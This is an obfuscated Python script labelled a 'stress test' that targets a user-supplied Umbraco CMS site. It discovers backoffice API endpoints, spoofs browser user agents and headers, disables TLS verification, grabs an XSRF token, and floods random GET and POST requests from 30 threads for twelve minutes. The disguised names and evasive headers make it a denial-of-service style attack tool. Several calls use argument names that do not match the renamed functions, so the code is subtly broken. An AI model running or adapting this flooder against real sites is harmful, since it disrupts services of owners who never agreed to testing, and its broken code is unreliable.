lllllllllllllll, llllllllllllllI, lllllllllllllIl, lllllllllllllII, llllllllllllIll, llllllllllllIlI, llllllllllllIIl = bool, __name__, range, Exception, print, input, KeyboardInterrupt

from requests.packages.urllib3 import disable_warnings as lIIllIIlllIIll
from random import uniform as IIIlIlIIIllIII, choice as lllIIlllllllII
from requests import head as IIIllllllllIII, post as IIIIIIIIllIIll, get as lIlllllIllllII
from time import sleep as IlIIIllIlllllI, time as lIlIlIllllIllI
from concurrent.futures import ThreadPoolExecutor as IIlIIllIIlIlIl
from requests.exceptions import RequestException as lIlllllIIIIIlI
from urllib3.exceptions import InsecureRequestWarning as llIlIlIIIllIIl
lIIllIIlllIIll(llIlIlIIIllIIl)

class IIIIIllIIIlllllIlI:

    def __init__(lIIIlIllIIllIIlllI):
        lIIIlIllIIllIIlllI.lIIllllIlllIllllll = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36']
        lIIIlIllIIllIIlllI.lIIIlllIlIIIIIllll = {'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'en-US,en;q=0.9', 'Connection': 'keep-alive', 'Content-Type': 'application/json', 'X-Requested-With': 'XMLHttpRequest'}
        lIIIlIllIIllIIlllI.lIIIllIlIlllIllllI = ['umbraco', 'umbraco/backoffice/UmbracoApi/Authentication/PostLogin', 'umbraco/backoffice/UmbracoApi/Content', 'umbraco/backoffice/UmbracoApi/Media', 'umbraco/backoffice/UmbracoApi/Member', 'umbraco/backoffice/UmbracoApi/Entity', 'umbraco/backoffice/UmbracoApi/Dictionary', 'umbraco/backoffice/UmbracoApi/Language', 'umbraco/backoffice/UmbracoApi/Template', 'umbraco/backoffice/UmbracoApi/DataType', 'umbraco/surface', 'api']
        lIIIlIllIIllIIlllI.lIlIIIlIllllIIllIl = {'auth_test': {'username': 'admin@example.com', 'password': 'admin123'}, 'content_test': {'contentTypeAlias': 'document', 'parentId': -1, 'name': 'Test Page'}}

    def IIIlIIlIlllIllllII(lIIIlIllIIllIIlllI):
        return lllIIlllllllII(lIIIlIllIIllIIlllI.lIIllllIlllIllllll)

    def IIlIlllIlllllIIllI(lIIIlIllIIllIIlllI, IlIIIlIlIlIlIlIllI, llIlIIlIllIlIllIII):
        """Verify endpoint availability before testing"""
        IllIIIllIIIIlIIllI = f"{IlIIIlIlIlIlIlIllI.rstrip('/')}/{llIlIIlIllIlIllIII.lstrip('/')}"
        try:
            lllIllIlIlIlIIIllI = IIIllllllllIII(IllIIIllIIIIlIIllI, headers={'User-Agent': lIIIlIllIIllIIlllI.IIIlIIlIlllIllllII()}, timeout=3, verify=lllllllllllllll(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 0), allow_redirects=lllllllllllllll(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 1))
            return 200 <= lllIllIlIlIlIIIllI.status_code < 404
        except:
            return lllllllllllllll(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 0)

    def IIIllllIIIIIlIlIll(lIIIlIllIIllIIlllI, IlIIIlIlIlIlIlIllI):
        """Discover valid Umbraco endpoints"""
        llllllllllllIll('[INFO] Discovering valid endpoints...')
        llIlIIlIIIIIIllIlI = []
        lIlIlIllIlIllIllIl = ['umbraco/lib', 'umbraco/assets', 'umbraco/preview', 'umbraco/api', 'umbraco/surface', 'umbraco/webservices', 'app_plugins', 'config', 'umbraco/dashboard', 'umbraco/developers', 'umbraco/settings']
        lIIIlIllIIllIIlllI.lIIIllIlIlllIllllI.extend(lIlIlIllIlIllIllIl)
        for llIlIIlIllIlIllIII in lIIIlIllIIllIIlllI.lIIIllIlIlllIllllI:
            if lIIIlIllIIllIIlllI.IIlIlllIlllllIIllI(IlIIIlIlIlIlIlIllI, llIlIIlIllIlIllIII):
                llllllllllllIll(f'[SUCCESS] Found valid endpoint: {llIlIIlIllIlIllIII}')
                llIlIIlIIIIIIllIlI.append(llIlIIlIllIlIllIII)
        if not llIlIIlIIIIIIllIlI:
            llllllllllllIll('[WARNING] No valid endpoints found. Using default endpoints.')
            return lIIIlIllIIllIIlllI.lIIIllIlIlllIllllI
        return llIlIIlIIIIIIllIlI

    def IlllIlIlllIllIlIll(lIIIlIllIIllIIlllI, IlIIIlIlIlIlIlIllI):
        """Get Umbraco security token"""
        try:
            lllIllIlIlIlIIIllI = lIlllllIllllII(f"{IlIIIlIlIlIlIlIllI.rstrip('/')}/umbraco/backoffice/UmbracoApi/Authentication/GetLoginSettings", headers={'User-Agent': lIIIlIllIIllIIlllI.IIIlIIlIlllIllllII()}, verify=lllllllllllllll(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 0))
            if lllIllIlIlIlIIIllI.ok:
                return lllIllIlIlIlIIIllI.json().get('token')
            return None
        except:
            return None

    def llIlIlllIlIlIIlIII(lIIIlIllIIllIIlllI, llIIlIIIIlIlIIllIl, IlIIIlIlIlIlIlIllI, llIlIIlIllIlIllIII, IlIlIlIllllIlIIlII=None):
        IllIIIllIIIIlIIllI = f"{IlIIIlIlIlIlIlIllI.rstrip('/')}/{llIlIIlIllIlIllIII.lstrip('/')}"
        lIIIlIllIIllIIlllI.lIIIlllIlIIIIIllll['User-Agent'] = lIIIlIllIIllIIlllI.IIIlIIlIlllIllllII()
        lIlIIIIIlllIIlllII = {'Cache-Control': 'no-cache', 'Pragma': 'no-cache', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty'}
        lIIIlIllIIllIIlllI.lIIIlllIlIIIIIllll.update(lIlIIIIIlllIIlllII)
        try:
            if llIIlIIIIlIlIIllIl.upper() == 'GET':
                lllIllIlIlIlIIIllI = lIlllllIllllII(IllIIIllIIIIlIIllI, headers=lIIIlIllIIllIIlllI.lIIIlllIlIIIIIllll, timeout=5, verify=lllllllllllllll(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 0), allow_redirects=lllllllllllllll(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 1))
            else:
                if IlIlIlIllllIlIIlII:
                    IIIllIllIIlIIlIIlI = lIIIlIllIIllIIlllI.IlllIlIlllIllIlIll(IlIIIlIlIlIlIlIllI)
                    if IIIllIllIIlIIlIIlI:
                        lIIIlIllIIllIIlllI.lIIIlllIlIIIIIllll['X-XSRF-TOKEN'] = IIIllIllIIlIIlIIlI
                lllIllIlIlIlIIIllI = IIIIIIIIllIIll(IllIIIllIIIIlIIllI, json=IlIlIlIllllIlIIlII, headers=lIIIlIllIIllIIlllI.lIIIlllIlIIIIIllll, timeout=5, verify=lllllllllllllll(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 0), allow_redirects=lllllllllllllll(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 1))
            if lllIllIlIlIlIIIllI.status_code in [404, 403]:
                return None
            llllllllllllIll(f'[{lllIllIlIlIlIIIllI.status_code}] {llIIlIIIIlIlIIllIl} {IllIIIllIIIIlIIllI}')
            return lllIllIlIlIlIIIllI.text if lllIllIlIlIlIIIllI.ok else None
        except lIlllllIIIIIlI as lllIlIllllIllIllll:
            llllllllllllIll(f'[ERROR] {llIIlIIIIlIlIIllIl} {IllIIIllIIIIlIIllI}: {lllIlIllllIllIllll}')
            return None

    def lIllIIlllIIlIllIll(lIIIlIllIIllIIlllI, IlIIIlIlIlIlIlIllI, lllllllllIIIlIlIIl=10, lllIlIllIIIIIIIIlI=60):
        llllllllllllIll(f'[INFO] Starting stress test on {IlIIIlIlIlIlIlIllI} for {lllIlIllIIIIIIIIlI}s with {lllllllllIIIlIlIIl} threads')
        llIlIIlIIIIIIllIlI = lIIIlIllIIllIIlllI.IIIllllIIIIIlIlIll(IlIIIlIlIlIlIlIllI)
        if not llIlIIlIIIIIIllIlI:
            llllllllllllIll('[ERROR] No valid endpoints found. Aborting test.')
            return
        lIIIlIllIIllIIlllI.lIIIllIlIlllIllllI = llIlIIlIIIIIIllIlI
        IIIlIIlIlIllllIIIl = lIlIlIllllIllI()

        def IIlIlIlIllIIllIIIl():
            while lIlIlIllllIllI() - IIIlIIlIlIllllIIIl < lllIlIllIIIIIIIIlI:
                llIlIIlIllIlIllIII = lllIIlllllllII(lIIIlIllIIllIIlllI.lIIIllIlIlllIllllI)
                llIIlIIIIlIlIIllIl = lllIIlllllllII(['GET', 'POST'])
                IIIllllIlIlIIlIIll = lIIIlIllIIllIIlllI.lIlIIIlIllllIIllIl.get('content_test') if llIIlIIIIlIlIIllIl == 'POST' else None
                IIllIIlllIIllIIlII = lIIIlIllIIllIIlllI.llIlIlllIlIlIIlIII(llIIlIIIIlIlIIllIl, IlIIIlIlIlIlIlIllI, llIlIIlIllIlIllIII, data=IIIllllIlIlIIlIIll)
                if IIllIIlllIIllIIlII:
                    IlIIIllIlllllI(IIIlIlIIIllIII(0.1, 0.3))
                else:
                    IlIIIllIlllllI(IIIlIlIIIllIII(0.5, 1.0))
        with IIlIIllIIlIlIl(max_workers=lllllllllIIIlIlIIl) as IIllllIlIIllIIIIIl:
            lIIIIIIIIlIlllIlIl = [IIllllIlIIllIIIIIl.submit(IIlIlIlIllIIllIIIl) for lIlllIIlllIIIlIIIl in lllllllllllllIl(lllllllllIIIlIlIIl)]
            for lIlIlIlIIlllIlIIIl in lIIIIIIIIlIlllIlIl:
                lIlIlIlIIlllIlIIIl.IIllIIlllIIllIIlII()

def lllIllIllIlIIIIIll():
    IIIIIIIllIIllIlllI = llllllllllllIlI('Enter target Umbraco URL (e.g., https://example.com): ').strip()
    if not (IIIIIIIllIIllIlllI.startswith('http://') or IIIIIIIllIIllIlllI.startswith('https://')):
        llllllllllllIll('[ERROR] Invalid URL. Please include http:// or https://')
        return
    try:
        IllllIlIllllIIIlII = IIIIIllIIIlllllIlI()
        IllllIlIllllIIIlII.lIllIIlllIIlIllIll(IIIIIIIllIIllIlllI, workers=30, duration=720)
    except llllllllllllIIl:
        llllllllllllIll('\n[INFO] Test interrupted by user.')
    except lllllllllllllII as lllIlIllllIllIllll:
        llllllllllllIll(f'[ERROR] Unexpected error occurred: {lllIlIllllIllIllll}')
if llllllllllllllI == '__main__':
    lllIllIllIlIIIIIll()
